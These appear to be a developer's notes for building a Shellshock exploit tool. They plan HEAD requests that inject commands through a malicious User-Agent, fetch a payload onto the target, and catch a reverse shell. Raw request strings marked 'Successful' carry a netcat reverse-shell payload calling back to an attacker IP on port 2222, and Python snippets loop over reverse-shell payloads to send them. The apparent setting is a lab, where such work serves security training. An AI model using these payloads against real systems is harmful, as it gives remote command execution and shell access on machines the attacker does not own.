To do; change the usage function to add a condition of filtering the number of args being more than whatâ€™s required. - 13/07/2020 19:56PM
----------------------------------------------------------------------------------------------------------------
Other:
  All the error handling happens in the scan_http function
  HTTP status code is collected using GET not HEAD
-----------------------------
main()
  List extraction is done in main()
  Most outputs are done in main()

-----------------------------
sys.exits:
  Current sys.exits = 2
    system.exit if no ports are open.
    if cgi_bin is = 404, sys.exit
    
  Future sys.exits:
    if no cgi_bin files in cgi_bin dir, sys.exit
 -----------------------------
DAY 2:

Goal:
try 1:
Get netcat (ip and port) to go straight to bin/py 
our side: open bind shell so the target can connect to us
try 2:
install python reverse shell as a binary. (no need for python on the target box)


Process:
try 1:
/bin/py waits for connections
attacker sends connection to /bin/py 
try 2:
execute file on their machine
listen on our machine.


Extra:
binpy is alias for our payload
-------------------------------------
Step 1:
1st craft a HEAD request to the target page hosted on the cgi-bin directory. We get this url via the shellshock_dect tool,

then modify the user agent with a malicious function of shellshock to get command execution for delivery of payload.
--- We will need to use Python requests in order to send a custom HTTP header which contains the payloads ---

inject payload via our command execution which requires our vulnerable URL
--- Payload attaches to the result URL from the shellshock_dect program ---

append host with target HTTP host to finish the HTTP head request
--- We need to complete the HTTP request and try to attach the host using bytes (Had issues with this before) ---

then, get the output and give it to a network socket
--- (Socket data delivery needs review) ---

upon which the target resides (ip and port)


-------------------------------------
Step 2:
payload comes back to us (as its a reverse shell)
	must have full pty capabilites.
	
We can write the main payload (rev shell) in C or Python and it will require a client on the target side which will need to be executed via payload delivery and this will connect back to the reverse shell which we have written. This will get rid of the "crutches" of having to rely on pre-made payloads 

NEW STTTTTTTTTTTTTTTTTTTTEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEPS:
step1:
target has shellshock vuln so we have command execution. attacker has payload hosted on python http server. wget payload from target via shellshock.
step2:
download payload onto /tmp or /dev/shm via HTTP server web delivery (If there are options, we can consider them too)
then plant our client script which connects back to the reverse shell on the target machine to invoke our payload and send it back to the attacker box.

Netcat call is one thing which we can consider but then we won't need the reverse shell payload to be sent back which we are writing. That's because this is how all of this will come together. 

1st step: We craft the HEAD request and this is what will contain common payloads such as python, perl, nc and bash.

When we craft this HEAD request we use pre-made payloads from the things listed (Python, etc.) in order to get a shell. We have to use a network listener using netcat. This is the stage where we simply focus on getting the HTTP requests in place with existing tools for a reverse shell. 

2nd step: (This will come after we've got the HTTP requests in place and will require testing between two machines since it's a reverse shell payload

shellshock_attacker.py testing notes

Testing of sending different types of requests to see which one catches a shell:

b'HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.0.102 2222 -e /bin/sh\r\nHost: 192.168.0.100\r\nConnection: close\r\n\r\n' <- Successful
b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc b'192.168.0.102' 2222 -e /bin/sh\r\nHost: 192.168.0.100\r\nConnection: close\r\n\r\n" <- failed (Manually added IP addresses and wrapped the b'' around it so it can be interpreted as bytes. It seems the b"" which is on the outer layer of the HEAD request is the byte stream rather than any internal points. All data which is passed in which is considered a string such as an IP address should be encoded using .encode()

b'HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.0.102 2222 -e /bin/sh\r\nHost: 192.168.0.100\r\nConnection: close\r\n\r\n' <- Manually added the IP without the b'' around them. In order to introduce the IP as a variable it is required to be encoded before stepping into the byte stream. This should be done internally to the function rather than externally since this has been seen to cause issues

Current issue:
 for payloads in rev_payload:
       # List containing all of the payloads
        # All of the individual payloads. They're lacking the byte encoding of the host which is why a shell is not caught
       ''' crucial to code '''
       print(type(payloads))
       payloads_encoded = payloads.encode()
       payload = b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; %s\r\nHost: %s\r\nConnection: close\r\n\r\n" % (payloads_encoded, rhost_encoded)
       print(payload)
       s.send(payload)

This loop should be able to send several requests... However, it seems like everything is in one big string.


Output of the function:
nc -e /bin/sh 192.168.0.102 2222
nc -e /bin/sh 192.168.0.102 2222
nc -e /bin/sh 192.168.0.102 2222

A socket request needs to be done one at a time

Time to take a step back and work with the list elements alone and then wrap them in a loop once better understanding gained. The for loop isn't really best COA at this point (Course of Action)


Outputs of some encoding:
Payload 1 normal: nc -e /bin/sh 192.168.0.102 2222 <- This doesn't get inserted into the payload as a variable because it needs encoding....
Payload 1 encoded: b'nc -e /bin/sh 192.168.0.102 2222'

s.sendall(Payload variable) <- This fires the payload across without any issues


This variable doesn't work and that's rather expected. 
payload_test = b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; b'/usr/bin/nc %s %d -e /bin/sh'\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded)

That's because there's additional b'' inside the existing byte stream which mangles the payload being executed since the HTTP protocol hasn't got a clue what b'' means


One method (not the best):
	Declare each payload manually within the function and then loop through it that way rather than trying to borrow all of the payloads externally because that's really messing with things atm

Putting payload into loop is pointless because once the payload is sent, the listener only works one time. This means the option of selecting your payload to send will probably be better than automating it 
